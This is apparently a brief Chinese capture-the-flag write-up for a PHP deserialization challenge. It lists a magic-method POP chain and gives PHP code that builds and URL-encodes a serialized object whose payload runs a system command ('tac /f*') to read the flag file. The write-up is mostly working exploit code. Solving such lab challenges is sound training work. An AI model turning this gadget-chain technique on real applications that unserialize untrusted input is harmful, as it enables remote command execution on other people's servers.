#PHP序列化 

获取 hint()
```
flag is in /
```

链：
```php
TianXiWei __wakeup()
=> Ilovetxw __call()
=> four __set()
=> Ilovetxw __toString()
=> NISA __invoke()
```

```php
<?php
class NISA
{
    public $fun;
    public $txw4ever = "System('tac /f*');";
}
class TianXiWei

{
    public $ext;
    public $x;
}
class Ilovetxw
{
    public $huang;
    public $su;
}
class four
{
    public $a = "TXW4EVER";
    private $fun = 'abc';
}
$a = new TianXiWei();
$a->ext = new Ilovetxw();
$a->ext->huang = new four();
$a->ext->huang->a = new Ilovetxw();
$a->ext->huang->a->su = new NISA();
echo urlencode(serialize($a));
```